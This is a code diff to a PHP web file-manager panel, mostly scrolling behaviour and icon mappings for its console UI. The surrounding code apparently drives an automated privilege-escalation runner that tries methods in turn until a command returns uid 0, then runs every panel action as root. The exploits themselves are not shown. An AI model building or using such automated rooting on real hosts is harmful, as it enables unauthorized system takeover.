@@ -44577,28 +46254,6 @@ input.inp,select.inp{height:32px}
 <script>
 const CWD  = <?=json_encode($fm->getCwd())?>;
 const FM_MAIN_PATH = <?=json_encode(realpath(__DIR__)?:__DIR__)?>;
-
-/* R79b · pick the mark that is readable on the bar behind it (white on a dark
-   bar, dark on a light one) and repaint on every theme change */
-(function(){
-  const lum=c=>{const m=c.match(/\d+(\.\d+)?/g);if(!m)return 0;
-    const [r,g,b]=m.map(Number).map(v=>{v/=255;return v<=0.03928?v/12.92:Math.pow((v+0.055)/1.055,2.4)});
-    return 0.2126*r+0.7152*g+0.0722*b;};
-  const bgOf=el=>{while(el&&el!==document.documentElement){
-      const c=getComputedStyle(el).backgroundColor;
-      if(c&&!/rgba\(0, 0, 0, 0\)|transparent/.test(c))return c;
-      el=el.parentElement;}
-    return getComputedStyle(document.documentElement).backgroundColor||'#000';};
-  const paint=()=>{
-    const box=document.querySelector('.brand-icon');if(!box)return;
-    const bar=document.querySelector('.topbar')||box;
-    box.dataset.on=lum(bgOf(bar))>0.42?'light':'dark';
-  };
-  paint();
-  document.addEventListener('DOMContentLoaded',paint);
-  window.addEventListener('load',paint);
-  new MutationObserver(paint).observe(document.documentElement,{attributes:true,attributeFilter:['data-theme','class']});
-})();
 const CSRF = <?=json_encode($_SESSION['csrf_token'])?>;
 const FM_AUDIO_CACHE_SCOPE = <?=json_encode(hash('sha256',(string)($_SESSION['fm_user']??'')."\0".(string)($_SESSION['fm_root']??'')))?>;
 const FM_UPLOAD_CHUNK_BYTES = <?=fm_upload_chunk_bytes()?>;
@@ -51590,7 +53245,54 @@ document.getElementById('rrDetailsBtn')?.addEventListener('click',()=>{rkReport(
    only then asks for the next. A method the machine settled instantly is held
    on screen for a moment, because an answer that fast is gone before it is
    read. */
-const RK={busy:false,wantPass:false,total:0,done:0,win:null,winNote:'',winState:null};
+const RK={busy:false,wantPass:false,total:0,done:0,win:null,winNote:'',winState:null,follow:true,current:null};
+/* the run is watched, not scrolled by hand: the panel keeps the step that is
+   being tried in view, and stops the moment the reader moves the scroll box
+   themselves - from then on the choice is theirs until the pill at the foot of
+   the list is pressed, which hands the list back to the run. */
+function rkScrollBox(){
+  const b=document.getElementById('rootMain');
+  return (b&&b.closest('.root-body'))||document.querySelector('#rootOv .root-body');
+}
+function rkFollowArm(on){
+  RK.follow=!!on;
+  const b=rkScrollBox();
+  if(b)b.dataset.rkFollow=RK.follow?'1':'0';
+  const pill=document.getElementById('rkFollow');
+  if(pill)pill.classList.toggle('on',!RK.follow);
+}
+function rkToStep(id,force){
+  if(!RK.follow&&!force)return;
+  const box=rkScrollBox();
+  const row=id?document.getElementById('rk-'+id):null;
+  if(!box||!row)return;
+  /* only the panel's own scroll box moves: the page underneath stays where the
+     reader left it, so the panel is never yanked out from under the eye. The
+     position is measured against the box itself, so it is right whatever the
+     row's offset parent happens to be. */
+  const rb=row.getBoundingClientRect(),bb=box.getBoundingClientRect();
+  const top=box.scrollTop+(rb.top-bb.top)-(box.clientHeight/2)+(rb.height/2);
+  box.scrollTop=Math.max(0,Math.min(top,box.scrollHeight-box.clientHeight));
+}
+function rkToHead(force){
+  if(!RK.follow&&!force)return;
+  const box=rkScrollBox();
+  if(box)box.scrollTop=0;
+}
+function rkInstallFollow(){
+  const box=rkScrollBox();
+  if(!box||box.dataset.rkWatch)return;
+  box.dataset.rkWatch='1';
+  ['wheel','touchmove','keydown','mousedown'].forEach(function(ev){
+    box.addEventListener(ev,function(e){
+      if(e&&e.type==='keydown'&&!/^(PageUp|PageDown|ArrowUp|ArrowDown|Home|End| )$/.test(e.key))return;
+      rkFollowArm(false);
+    },{passive:true});
+  });
+  const pill=document.getElementById('rkFollow');
+  if(pill)pill.addEventListener('click',function(){rkFollowArm(true);rkToStep(RK.current,true);});
+}
+document.addEventListener('DOMContentLoaded',rkInstallFollow);
 const RK_HOLD_FIRED=620,RK_HOLD_SKIP=300,RK_GAP=220,RK_TAIL=200;
 function rkBox(){return document.getElementById('rootMain');}
 function rkMode(cls){const b=rkBox();if(!b)return;b.classList.remove('idle','run','ok','bad');b.classList.add(cls);}
@@ -51681,6 +53383,7 @@ async function rkRun(){
   const pass=document.getElementById('rootPass');
   const pw=pass?pass.value:'';
   rkMode('run');rkFace('ROOTING','0 of '+RK.total,ROOT_SVG.shield);rkRing(0);rkRows(list);
+  RK.current=null;rkFollowArm(true);rkInstallFollow();rkToHead(true);
   rkSay('Every method is tried in order. The run stops at the first one whose command really comes back as <b>uid 0</b>.','');
   for(let i=0;i<list.length;i++){
     const c=list[i];
@@ -51694,7 +53397,9 @@ async function rkRun(){
       RK.done=i+1;rkRing(RK.done/RK.total);
       continue;
     }
+    RK.current=c.id;
     rkRow(c.id,'now','running',c.note||c.idea||'','<span class="rk-spin-ic"></span>');
+    rkToStep(c.id);
     rkSay('','trying: '+c.name,true);
     const t0=Date.now();
     const r=await rootCall('rootstep',{id:c.id,password:pw||''});
@@ -51714,10 +53419,12 @@ async function rkRun(){
       await rkSleep(RK_GAP);
     }
   }
-  RK.busy=false;
+  RK.busy=false;RK.current=null;
+  rkFollowArm(true);
   if(RK.win){
     rkMode('ok');RK.done=RK.total;rkRing(1);rkFace('ROOTED','installed',ROOT_SVG.ok);
     rkSay('Root is installed with <b>'+rootEsc(RK.win.name)+'</b>. '+rootEsc(RK.winNote)+' Every privileged action of this panel now runs as <b>uid 0</b>.','');
+    rkToHead(true);
     toast('Root installed: '+(RK.win.name||RK.win.id));
     if(RK.winState)rootRenderRooted(RK.winState);
     const q=await rootCall('rooted');
@@ -51726,6 +53433,7 @@ async function rkRun(){
   }else{
     rkMode('bad');rkFace('NO ROUTE','nothing worked',ROOT_SVG.bad);rkRing(1);
     rkSay('No method could put root on this machine. Nothing is left half installed: every method is listed above with the reason this host gave.','press the dial to walk them again');
+    rkToHead(true);
     const q=await rootCall('rooted');
     if(q&&q.rooted)rootRenderRooted(q.rooted);
   }
@@ -53784,6 +55492,29 @@ window.FM_ICONS=FM_ICONS;
 /* ══ the console's own glyphs ═══════════════════════════════════════════════
    Every tile and every row of the left tree wears the MobaXterm bitmap. The
    number is the program's own slot, so the icons sit where MobaXterm puts them. */
+const TERM_GLYPH={
+  font:'22', /* the folder the pack keeps these in: FLICO22 */
+  /* toolbar · green +, red −, the × of a tab, the clipboard, and the arrows */
+  act:{newtab:0,closetab:1,clear:10,paste:244,bottom:274,up:256,cwd:250,help:310,
+       refresh:240,openhere:272,menu:310,keep:19,panel:287},
+  /* side rail · a screen for sessions, the toolbox, the notepad for macros, the
+     folder of drops for SFTP, the sheet for the log, the folder of places, the
+     numbered list for the queue, the tray for the display */
+  rail:{sessions:142,tools:53,macros:243,sftp:250,log:101,places:287,queue:268,display:65},
+  /* tree · a host, the penguin of the box it is, the drive of the root folder,
+     and one picture per kind of file */
+  tree:{sessions:142,host:142,kali:93,linux:269,root:224,folder:31,open:32,
+        file:299,zip:343,archive:343,image:39,audio:47,video:38,code:128,text:299,
+        pdf:245,sheet:244,exec:56,config:53,db:224,unknown:302},
+  url(n){return '?x=iconfile&pack=term&f='+encodeURIComponent('FLICO'+this.font+'/'+n+'.png');},
+  img(n,cls,size){
+    if(n===undefined||n===null)return '';
+    const s=size?' width="'+size+'" height="'+size+'"':'';
+    return '<img class="'+(cls||'tgi')+'" src="'+this.url(n)+'"'+s+' alt="" decoding="async" data-pack="term" data-ico="FLICO'+this.font+'/'+n+'.png">';
+  }
+};
+window.TERM_GLYPH=TERM_GLYPH;
+/* which picture a name wears: the extension decides, the folder flag wins */
 const TERM_EXT={
   zip:'archive',rar:'archive','7z':'archive',gz:'archive',tgz:'archive',tar:'archive',bz2:'archive',xz:'archive',zst:'archive',
   png:'image',jpg:'image',jpeg:'image',gif:'image',webp:'image',bmp:'image',svg:'image',ico:'image',tif:'image',tiff:'image',avif:'image',
@@ -53798,30 +55529,6 @@ const TERM_EXT={
   csv:'sheet',xls:'sheet',xlsx:'sheet',ods:'sheet',numbers:'sheet',
   txt:'text',log:'text',md:'text',markdown:'text',nfo:'text',rst:'text',doc:'text',docx:'text',odt:'text',rtf:'text',ppt:'text',pptx:'text',odp:'text'
 };
-
-const TERM_GLYPH={
-  font:'22', /* the folder the pack keeps these in: FLICO22 */
-  /* toolbar · green +, red −, the × of a tab, the clipboard, and the arrows */
-  act:{newtab:0,closetab:1,clear:10,paste:244,bottom:274,up:256,cwd:250,help:310,
-       refresh:240,openhere:272,menu:310,keep:19,panel:287},
-  /* side rail · a screen for sessions, the toolbox, the notepad for macros, the
-     folder of drops for SFTP, the sheet for the log, the folder of places, the
-     numbered list for the queue, the tray for the display */
-  rail:{sessions:215,tools:53,macros:243,sftp:250,log:285,places:287,queue:268,display:65},
-  /* tree · a host, the penguin of the box it is, the drive of the root folder,
-     and one picture per kind of file */
-  tree:{sessions:142,host:86,kali:93,linux:269,root:224,cwd:32,folder:31,open:32,
-        file:299,zip:282,archive:282,image:39,audio:47,video:38,code:128,text:281,
-        pdf:300,sheet:283,exec:208,config:53,db:343,unknown:299},
-  url(n){return '?x=iconfile&pack=term&f='+encodeURIComponent('FLICO'+this.font+'/'+n+'.png');},
-  img(n,cls,size){
-    if(n===undefined||n===null)return '';
-    const s=size?' width="'+size+'" height="'+size+'"':'';
-    return '<img class="'+(cls||'tgi')+'" src="'+this.url(n)+'"'+s+' alt="" decoding="async" data-pack="term" data-ico="FLICO'+this.font+'/'+n+'.png">';
-  }
-};
-window.TERM_GLYPH=TERM_GLYPH;
-/* the tree's file glyph, chosen by the name the way the console does */
 /* R79 · the console's pictures: each tile and each rail button asks the pack for
    its glyph. The line drawing stays underneath as the fallback and is hidden the
    moment the bitmap arrives, so a pack that cannot be fetched leaves the window
@@ -53860,9 +55567,7 @@ window.TERM_GLYPH=TERM_GLYPH;
     document.querySelectorAll('.term-tree-row .tgi').forEach(im=>{
       if(im.dataset.wired)return;
       im.dataset.wired='1';
-      im.addEventListener('load',()=>{const p=im.parentElement;if(!p)return;
-        p.querySelectorAll('.tgi-svg').forEach(sv=>sv.style.display='none');
-        p.querySelectorAll('svg').forEach(sv=>sv.style.display='none');},{once:true});
+      im.addEventListener('load',()=>{const sv=im.parentElement&&im.parentElement.querySelector('.tgi-svg');if(sv)sv.style.display='none';},{once:true});
       im.addEventListener('error',()=>{if(typeof FM_ICONS!=='undefined')FM_ICONS.heal(im);const sv=im.parentElement&&im.parentElement.querySelector('.tgi-svg');if(sv)sv.style.display='';});
       if(im.complete&&im.naturalWidth)im.dispatchEvent(new Event('load'));
     });
@@ -53896,8 +55601,11 @@ window.TERM_GLYPH=TERM_GLYPH;
   document.addEventListener('DOMContentLoaded',paint);
   setTimeout(paint,700);setTimeout(paint,1800);
   window.FM_TERM_GLYPH_PAINT=paint;
+  /* the map below is declared later in this file: let it land first */
+  setTimeout(paint,0);
 })();
-/* which picture a name wears: the extension decides, the folder flag wins */
+
+
 function termGlyphFor(name,isDir,kind){
   if(kind&&TERM_GLYPH.tree[kind]!==undefined)return TERM_GLYPH.tree[kind];
   if(isDir)return TERM_GLYPH.tree.folder;
